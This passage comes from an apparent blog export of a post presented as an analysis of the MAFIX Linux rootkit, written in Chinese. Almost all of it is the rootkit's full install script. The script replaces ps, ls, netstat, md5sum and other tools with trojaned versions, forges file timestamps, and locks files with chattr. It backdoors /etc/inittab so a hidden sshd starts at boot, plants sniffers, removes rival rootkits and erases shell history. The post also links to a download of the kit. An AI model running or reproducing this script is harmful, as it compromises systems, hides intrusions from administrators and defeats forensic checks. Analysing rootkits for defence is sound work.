2&gt;/dev/null</p><p>chmod a+xr /sbin/ttyload 2&gt;/dev/null</p><p>chmod o-w /sbin/ttyload 2&gt;/dev/null</p><p>touch -acmr /bin/ls /sbin/ttyload</p><p>chattr +isa /sbin/ttyload</p><p>kill -9 `pidof ttyload` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>mv $BASEDIR/bin/ttymon /sbin/ttymon 2&gt;/dev/null</p><p>chmod a+xr /sbin/ttymon 2&gt;/dev/null</p><p>touch -acmr /bin/ls /sbin/ttymon</p><p>chattr +isa /sbin/ttymon</p><p>kill -9 `pidof ttymon` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>cp /bin/bash $SSHDIR</p><p>&nbsp;</p><p># INITTAB SHUFFLING</p><p>&nbsp;</p><p>chattr -isa /etc/inittab</p><p>cat /etc/inittab |grep -v ttyload|grep -v getty &gt; /tmp/.init1</p><p>cat /etc/inittab |grep getty &gt; /tmp/.init2</p><p>echo &quot;# Loading standard ttys&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;0:2345:once:/usr/sbin/ttyload&quot; &gt;&gt; /tmp/.init1</p><p>cat /tmp/.init2 &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# modem getty.&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# mo:235:respawn:/usr/sbin/mgetty -s 38400 modem&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# fax getty (hylafax)&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# mo:35:respawn:/usr/lib/fax/faxgetty /dev/modem&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# vbox (voice box) getty&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# I6:35:respawn:/usr/sbin/vboxgetty -d /dev/ttyI6&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# I7:35:respawn:/usr/sbin/vboxgetty -d /dev/ttyI7&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# end of /etc/inittab&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;/sbin/ttyload -q &gt;/dev/null 2&gt;&amp;1&quot; &gt; /usr/sbin/ttyload</p><p>echo &quot;/sbin/ttymon &gt;/dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>touch -acmr /bin/ls /usr/sbin/ttyload</p><p>chmod +x /usr/sbin/ttyload 2&gt;/dev/null</p><p>chattr +isa /usr/sbin/ttyload</p><p>/usr/sbin/ttyload &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>touch -amcr /etc/inittab /tmp/.init1</p><p>mv -f /tmp/.init1 /etc/inittab 2&gt;/dev/null</p><p>rm -rf /tmp/.init2</p><p>&nbsp;</p><p># MAKING SURE WE GOT IT BACKDORED RIGHT !</p><p>&nbsp;</p><p>if [ ! &quot;`grep ttyload /etc/inittab`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} inittab broken, sshd wont be loaded upon reboot :(${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p># Say hello to md5sum fixer boys n gurls !</p><p>&nbsp;</p><p>if [ -f /sbin/ifconfig ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /sbin/ifconfig &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/ps ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/ps &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/ls ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/ls &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/netstat ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/netstat &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/find ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/find &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/top ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/top &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/sbin/lsof ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/sbin/lsof &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/slocate ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/slocate &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/dir ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/dir &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/md5sum ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/md5sum &gt;&gt; .shmd5</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>if [ ! -f /dev/srd0 ]; then</p><p>&nbsp; ./encrypt -e .shmd5 /dev/srd0</p><p>&nbsp; touch -acmr /bin/ls /dev/srd0</p><p>&nbsp; chattr a+r /dev/srd0</p><p>&nbsp; chown -f root:root /dev/srd0</p><p>fi</p><p>&nbsp;</p><p>rm -rf .shmd5</p><p>&nbsp;</p><p>&nbsp;</p><p># time change bitch</p><p>&nbsp;</p><p>touch -acmr /sbin/ifconfig ifconfig &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/ps ps &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/ls ls &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/netstat netstat &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/find find &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/top top &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/sbin/lsof lsof &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /sbin/syslogd syslogd &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/slocate slocate &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/dir dir &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/md5sum md5sum &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/pstree pstree &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>&nbsp;</p><p># Backdoor ps/top/du/ls/netstat/etc..</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>&nbsp;</p><p>BACKUP=/usr/lib/libsh/.backup</p><p>mkdir $BACKUP 2&gt;/dev/null</p><p>&nbsp;</p><p># ps ...</p><p>if [ -f /usr/bin/ps ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/ps</p><p>&nbsp; &nbsp;cp /usr/bin/ps $BACKUP</p><p>&nbsp; &nbsp;mv -f ps /usr/bin/ps 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/ps</p><p>fi</p><p>&nbsp;</p><p>if [ -f /bin/ps ]; then</p><p>&nbsp; &nbsp;chattr -isa /bin/ps</p><p>&nbsp; &nbsp;cp /bin/ps $BACKUP</p><p>&nbsp; &nbsp;mv -f ps /bin/ps 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /bin/ps</p><p>fi</p><p>&nbsp;</p><p># ifconfig ...</p><p>chattr -isa /sbin/ifconfig</p><p>cp /sbin/ifconfig $BACKUP</p><p>mv -f ifconfig /sbin/ifconfig 2&gt;/dev/null</p><p>chattr +isa\n/sbin/ifconfig</p><p>&nbsp;</p><p># netstat ...</p><p>if [ -f /usr/sbin/netstat ]; then</p><p>&nbsp; chattr -isa /usr/sbin/netstat</p><p>&nbsp; mv -f netstat /usr/sbin/netstat 2&gt;/dev/null</p><p>&nbsp; chattr +isa /usr/sbin/netstat</p><p>fi</p><p>&nbsp;</p><p>chattr -isa /bin/netstat</p><p>cp /bin/netstat $BACKUP</p><p>mv -f netstat /bin/netstat 2&gt;/dev/null</p><p>chattr +isa /bin/netstat</p><p>&nbsp;</p><p># top ...</p><p>if [ -f /usr/bin/top ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/top</p><p>&nbsp; &nbsp;cp /usr/bin/top $BACKUP</p><p>&nbsp; &nbsp;mv -f top /usr/bin/top 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/top</p><p>&nbsp; &nbsp;if [ -f /lib/libncurses.so.5 ]; then</p><p>&nbsp; &nbsp; &nbsp; ln -s /lib/libncurses.so.5 /lib/libncurses.so.4 2&gt;/dev/null</p><p>&nbsp; &nbsp;fi</p><p>&nbsp; &nbsp;if [ -f /usr/lib/libncurses.so.5 ]; then</p><p>&nbsp; &nbsp; &nbsp; ln -s /usr/lib/libncurses.so.5 /lib/libncurses.so.4 2&gt;/dev/null</p><p>&nbsp; &nbsp;fi</p><p>fi</p><p>&nbsp;</p><p># slocate ...</p><p>if [ -f /usr/bin/slocate ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/slocate</p><p>&nbsp; &nbsp;cp /usr/bin/slocate $BACKUP</p><p>&nbsp; &nbsp;mv -f slocate /usr/bin/slocate 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/slocate</p><p>fi</p><p>&nbsp;</p><p># ls ...</p><p>chattr -isa /bin/ls</p><p>cp /bin/ls $BACKUP</p><p>mv -f ls /bin/ls 2&gt;/dev/null</p><p>chattr +isa /bin/ls</p><p>&nbsp;</p><p># find ...</p><p>if [ -f /usr/bin/find ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/find</p><p>&nbsp; &nbsp;cp /usr/bin/find $BACKUP</p><p>&nbsp; &nbsp;mv -f find /usr/bin/find 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/find</p><p>fi</p><p>&nbsp;</p><p># dir ...</p><p>if [ -f /usr/bin/dir ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/dir</p><p>&nbsp; &nbsp;cp /usr/bin/dir $BACKUP</p><p>&nbsp; &nbsp;mv -f dir /usr/bin/dir 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/dir</p><p>fi</p><p>&nbsp;</p><p># lsof ...</p><p>if [ -f /usr/sbin/lsof ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/lsof</p><p>&nbsp; &nbsp;cp /usr/sbin/lsof $BACKUP</p><p>&nbsp; &nbsp;mv -f lsof /usr/sbin/lsof 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/sbin/lsof</p><p>fi</p><p>&nbsp;</p><p># pstree ...</p><p>if [ -f /usr/bin/pstree ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/pstree</p><p>&nbsp; &nbsp;cp /usr/bin/pstree $BACKUP</p><p>&nbsp; &nbsp;mv -f pstree /usr/bin/pstree 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/pstree</p><p>fi</p><p>&nbsp;</p><p># md5sum ...</p><p>chattr -isa /usr/bin/md5sum</p><p>cp /usr/bin/md5sum $BACKUP</p><p>mv -f md5sum /usr/bin/md5sum 2&gt;/dev/null</p><p>chattr +isa /usr/bin/md5sum</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} backdoored some daemons (netstat, ps)${RES}&quot;</p><p>&nbsp;</p><p>cd $BASEDIR</p><p>&nbsp;</p><p>mkdir $HOMEDIR/.sniff 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shsniff $HOMEDIR/.sniff/shsniff 2&gt;/dev/null</p><p>chmod +x $BASEDIR/bin/sshd 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shp $HOMEDIR/.sniff/shp 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shsb $HOMEDIR/shsb 2&gt;/dev/null</p><p>mv $BASEDIR/bin/hide $HOMEDIR/hide 2&gt;/dev/null</p><p>touch -acmr /bin/ls $HOMEDIR/.sniff/shsniff</p><p>touch -acmr /bin/ls $HOMEDIR/.sniff/shp</p><p>touch -acmr /bin/ls $HOMEDIR/shsb</p><p>touch -acmr /bin/ls $HOMEDIR/hide</p><p>chmod +x $HOMEDIR/.sniff/* 2&gt;/dev/null</p><p>chmod +x $HOMEDIR/shsb 2&gt;/dev/null</p><p>chmod +x $HOMEDIR/hide 2&gt;/dev/null</p><p>./bin/sshd $1 $2 &gt;&gt; /dev/null</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} checking for some vuln daemons....${RES}&quot;</p><p>ps aux &gt; /tmp/.procs</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep named`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} NAMED FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/wu.ftpd ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} WU-FTPD FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep smbd`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} SAMBA FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep rpc.statd`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} RPC.STATD FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>rm -rf /tmp/.procs</p><p>&nbsp;</p><p>netstat -natp &gt; /tmp/.stats</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.stats | grep 443 | grep http`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} MOD_SSL FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>rm -rf /tmp/.stats</p><p>&nbsp;</p><p>&nbsp;</p><p># CHECKING FOR HOSTILE ROOTKITS/BACKDORS</p><p>&nbsp;</p><p>&nbsp;</p><p>mkdir $HOMEDIR/.owned 2&gt;/dev/null</p><p>&nbsp;</p><p>if [ -f /etc/ttyhash ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /etc/ttyhash</p><p>&nbsp; &nbsp;rm -rf /etc/ttyhash</p><p>fi</p><p>&nbsp;</p><p>if [ -d /lib/ldd.so ]; then</p><p>&nbsp; &nbsp;chattr -isa /lib/ldd.so</p><p>&nbsp; &nbsp;chattr -isa /lib/ldd.so/*</p><p>&nbsp; &nbsp;mv /lib/ldd.so $HOMEDIR/.owned/tk8</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} tk8 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/src/.puta ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/src/.puta</p><p>&nbsp; &nbsp;chattr -isa /usr/src/.puta/*</p><p>&nbsp; &nbsp;mv /usr/src/.puta $HOMEDIR/.owned/tk7</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} tk7 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/xntpd ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/xntpd</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/xntpd</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/nscd ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/nscd</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/nscd</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/include/bex ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/info/termcap.info-5.gz; rm -rf /usr/info/termcap.info-5.gz</p><p>&nbsp; &nbsp;chattr -isa /usr/include/audit.h; rm -rf /usr/include/audit.h</p><p>&nbsp; &nbsp;chattr -isa /usr/include/bex</p><p>&nbsp; &nbsp;chattr -isa /usr/include/bex/*</p><p>&nbsp; &nbsp;mv /usr/include/bex/ $HOMEDIR/.owned/bex2</p><p>&nbsp; &nbsp;if [ -f /var/log/tcp.log ]; then</p><p>&nbsp; &nbsp; &nbsp; chattr -isa /var/log/tcp.log</p><p>&nbsp; &nbsp; &nbsp; cp /var/log/tcp.log $HOMEDIR/.owned/bex2/snifflog</p><p>&nbsp; &nbsp;fi</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} bex2 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -d /dev/tux/ ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/xsf &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/xsf &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/xchk &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/xchk &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;chattr -isa /dev/tux &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;mv /dev/tux $HOMEDIR/.owned/tuxkit</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} tuxkit found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/bin/ssh2d ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/ssh2d</p><p>&nbsp; &nbsp;rm -rf /usr/bin/ssh2d</p><p>&nbsp; &nbsp;chattr -isa /lib/security/.config/</p><p>&nbsp; &nbsp;chattr -isa /lib/security/.config/*</p><p>&nbsp; &nbsp;rm -rf /lib/security/.config</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} optickit found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /etc/ld.so.hash ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/ld.so.hash</p><p>&nbsp; &nbsp;rm -rf /etc/ld.so.hash</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>chattr +isa /usr/lib/libsh</p><p>chattr +isa /lib/libsh.so</p><p>&nbsp;</p><p># GREPPING SHITZ FROM rc.sysinit and inetd.conf</p><p>&nbsp;</p><p>if [ -f /etc/rc.d/rc.sysinit ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/rc.d/rc.sysinit</p><p>&nbsp; &nbsp;cat /etc/rc.d/rc.sysinit | grep -v &quot;# Xntps (NTPv3 daemon) startup..&quot;| grep -v &quot;/us\nr/sbin/xntps&quot;| grep -v &quot;/usr/sbin/nscd&quot; &gt; /tmp/.grep</p><p>&nbsp; &nbsp;chmod +x /tmp/.grep</p><p>&nbsp; &nbsp;touch -acmr /etc/rc.d/rc.sysinit /tmp/.grep</p><p>&nbsp; &nbsp;mv -f /tmp/.grep /etc/rc.d/rc.sysinit</p><p>&nbsp; &nbsp;rm -rf /tmp/.grep</p><p>fi</p><p>&nbsp;</p><p>if [ -f /etc/inetd.conf ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/inetd.conf</p><p>&nbsp; &nbsp;cat /etc/inetd.conf | grep -v &quot;6635&quot;| grep -v &quot;9705&quot; &gt; /tmp/.grep</p><p>&nbsp; &nbsp;touch -acmr /etc/inted.conf /tmp/.grep</p><p>&nbsp; &nbsp;mv -f /tmp/.grep /etc/inetd.conf</p><p>&nbsp; &nbsp;rm -rf /tmp/.grep</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p># KILLING SOME LAMME DAEMONS</p><p>&nbsp;</p><p>killall -9 -q nscd &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xntps &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q mountd &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q mserv &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q psybnc &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q t0rns &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q linsniffer &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sniffer &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q lpsched &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sniff &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sn1f &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xsf &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xchk &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q ssh2d &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} sysinfo:${RES}&quot;</p><p>MYIPADDR=`/sbin/ifconfig eth0 | grep &quot;inet addr:&quot; | awk -F ' ' ' {print $2} ' | cut -c6-`</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; hostname :${CYN} `hostname -f` ($MYIPADDR)${RES}&quot;</p><p>uname -a | awk '{ print &nbsp;$11 }' &gt;/tmp/info_tmp</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; arch: ${CYN}`cat /tmp/info_tmp` -+- bogomips : `cat /proc/cpuinfo | grep bogomips | awk ' {print $3}'` '${RES}&quot;</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; alternative ip: ${CYN} &quot;`hostname -i`&quot; -+- &nbsp;Might be [&quot;`/sbin/ifconfig | grep eth | wc -l`&quot; ] active adapters.${RES}&quot;</p><p>&nbsp;</p><p>if [ -f /etc/redhat-release ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/redhat-release`${RES}&quot;</p><p>elif [ -f /etc/slackware-version ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/slackware-version`${RES}&quot;</p><p>elif [ -f /etc/debian_version ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/debian_version`${RES}&quot;</p><p>elif [ -f /etc/SuSE-release ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/SuSE-release`${RES}&quot;</p><p>elif [ -f /etc/issue ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/issue`${RES}&quot;</p><p>else echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} unknown${RES}&quot;</p><p>fi</p><p>echo</p><p>echo -n &quot;${CYN}mafix!${DMAG} &gt; cleaning up some traces... ${RES}&quot;</p><p>unset HISTFILE;unset HISTSIZE;unset HISTORY;unset HISTSAVE;unset HISTFILESIZE</p><p>if [ -f /.bash_history ]; then</p><p>&nbsp; &nbsp;chattr -isa /.bash_history &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /.bash_history</p><p>fi</p><p>&nbsp;</p><p>if [ -f /bin/.bash_history ]; then</p><p>&nbsp; &nbsp;chattr -isa /bin/.bash_history</p><p>&nbsp; &nbsp;rm -rf /bin/.bash_history</p><p>fi</p><p>cd $BASEDIR</p><p>rm -rf /tmp/.r*</p><p>cd ..</p><p>rm -rf mafix*</p><p>echo -n &quot;${CYN}done!${RES}&quot;</p><p>echo</p><p>rm -rf /tmp/info_tmp</p><p>endtime=`date +%S`</p><p>echo</p><p>echo</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; /__/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; ${DMAG} &nbsp; ___ &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; /__/| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:: &nbsp; &nbsp; &nbsp; / &nbsp;/:: &nbsp; &nbsp; &nbsp; / &nbsp;/:/_ &nbsp;${DMAG} &nbsp;/ &nbsp;/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:|: &nbsp; &nbsp; / &nbsp;/:/: &nbsp; &nbsp; / &nbsp;/:/ / ${DMAG} / &nbsp;/:/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;__|__|:|: &nbsp; / &nbsp;/:/~/:: &nbsp; / &nbsp;/:/ /:/ ${DMAG}/__/:: &nbsp; &nbsp;${CYN} &nbsp;__|__|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} /__/::::| : /__/:/ /:/: /__/:/ /:/ &nbsp;${DMAG}__/:__ ${CYN} /__/::::____${RES}&quot;</p><p>echo &quot;${CYN}  &nbsp;:~~__/  &nbsp;:/:/__/  &nbsp;:/:/ &nbsp; ${DMAG} &nbsp;  &nbsp;:/ ${CYN} &nbsp; ~~~::::/${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;::/ &nbsp; &nbsp; &nbsp;  &nbsp;::/ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;__::/${CYN} &nbsp; &nbsp; |~~|:|~~ ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;  &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;/__/:/ ${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; ${DMAG} &nbsp; &nbsp;__/ &nbsp;${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; ${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; |__|/ &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG}${RES}&quot;</p><p>echo &quot;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Password: $1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG} &nbsp;  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Port: $2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;${RES}&quot;</p><p>&nbsp;</p><p>if [ -f /usr/sbin/syslogd ]; then</p><p>&nbsp; &nbsp;/usr/sbin/syslogd -m 0</p><p>else</p><p>&nbsp; &nbsp;/sbin/syslogd -m 0</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/inetd ]; then</p><p>&nbsp; &nbsp;killall -HUP inetd &gt;/dev/null 2&gt;&amp;1</p><p>elif [ -f /usr/sbin/xinetd ]; then</p><p>&nbsp; &nbsp;killall -HUP xinetd</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p></p>","slug":"MAFIX---Linux-2.6-rootkit分析","published":1,"updated":"2023-04-22T05:38:44.667Z","_id":"clgrjlxhx00497opib8ei1ydj","comments":1,"layout":"post","photos":[],"link":"","content":"<p>MAFIX - Linux 2.6 rootkit</p><p>这后门很贱，服务器中过一次，属于这个后门的改版。那个添加了模块。</p><p>下载地址：</p><p>https://forum.eviloctal.com/attachment.php?aid=13419</p><p>内容：</p><p>MAXFIX</p><p>---HOW-TO</p><p>---mafix</p><p>---mafixlibs 